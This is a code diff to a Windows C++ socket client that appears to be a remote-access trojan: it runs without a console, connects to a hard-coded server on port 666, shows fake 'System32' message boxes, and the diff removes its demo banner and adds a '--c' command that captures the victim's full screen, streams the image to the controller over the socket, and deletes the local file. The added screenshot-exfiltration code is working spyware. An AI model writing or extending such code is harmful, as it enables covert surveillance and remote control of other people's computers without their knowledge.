@@ -6,11 +6,16 @@
 #include <winsock2.h>
 #include <direct.h>
 #include <windows.h>
+#include <gdiplus.h>
 
 #define PORT 666
 #define SERVERADDR "192.168.1.69"
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma comment(lib,"Ws2_32.lib")
+#pragma comment(lib, "GdiPlus.lib")
+
+static const GUID png =
+{ 0x557cf406, 0x1a04, 0x11d3, { 0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e } };
 
 using namespace std;
 
@@ -44,7 +49,7 @@ int main(int argc, char* argv[])
 	for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
 		buff[i] = '\0';
 	}
-	printf("TCP DEMO CLIENT\n");
+	//printf("TCP DEMO CLIENT\n");
 
 
 	if (WSAStartup(0x202, (WSADATA *)&buff[0]))
@@ -147,6 +152,42 @@ int main(int argc, char* argv[])
 		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'm')) {
 			std::string result = buff + 4;
 			std::cout << MessageBox(NULL, result.c_str(), "System32", MB_OK | MB_ICONWARNING);
+		}
+		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'c')) {
+			using namespace Gdiplus;
+			GdiplusStartupInput gdiplusStartupInput;
+			ULONG_PTR gdiplusToken;
+			GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
+			HDC scrdc, memdc;
+			HBITMAP membit;
+			scrdc = GetDC(0);
+			int Height, Width;
+			Height = GetSystemMetrics(SM_CYSCREEN);
+			Width = GetSystemMetrics(SM_CXSCREEN);
+			memdc = CreateCompatibleDC(scrdc);
+			membit = CreateCompatibleBitmap(scrdc, Width, Height);
+			SelectObject(memdc, membit);
+			BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
+			HBITMAP hBitmap;
+			hBitmap = (HBITMAP)SelectObject(memdc, membit);
+			Gdiplus::Bitmap bitmap(hBitmap, NULL);
+			bitmap.Save(L"screen.png", &png);
+			DeleteObject(hBitmap);
+			FILE *in1;
+			fopen_s(&in1, "screen.png", "rb");
+			while (!feof(in1)) {
+				char bufer[1024] = "";
+				int b = fread(bufer, 1, sizeof(bufer), in1);
+				int size = ftell(in1);
+				if (b != 0) send(my_sock, bufer, b, 0);
+			}
+			Sleep(6000);
+			send(my_sock, "@@^", 3, 0);
+			fclose(in1);
+			remove("screen.png");
+			std::cout << MessageBox(NULL,"del", "System32", MB_OK | MB_ICONWARNING);
+
 		}
 	}
 	//printf("Recv error %d\n", WSAGetLastError());
